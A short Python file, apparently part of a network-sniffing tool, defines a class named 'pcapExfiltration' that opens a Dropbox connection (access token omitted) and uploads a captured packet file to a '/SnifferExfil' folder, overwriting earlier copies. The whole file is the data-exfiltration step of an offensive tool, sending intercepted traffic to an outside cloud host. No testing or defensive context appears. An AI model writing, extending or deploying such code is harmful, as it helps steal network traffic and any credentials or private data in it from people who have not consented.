import dropbox

class pcapExfiltration:
    def __init__(self, filePath):
        self.pathToFile = filePath
    
    def connect(self):
        try:
            connection = dropbox.Dropbox() # Access token needed, omitted for security reasons
            return connection
        except Exception:
            exit("There was an error connecting to the Dropbox API!")

    def upload(self):
        try:
            connection = self.connect()
            connection.files_upload(open(self.pathToFile, "rb").read(), "/SnifferExfil/PiTak.pcap", mode = dropbox.files.WriteMode("overwrite"))
        except Exception:
            exit("Error with uploading process")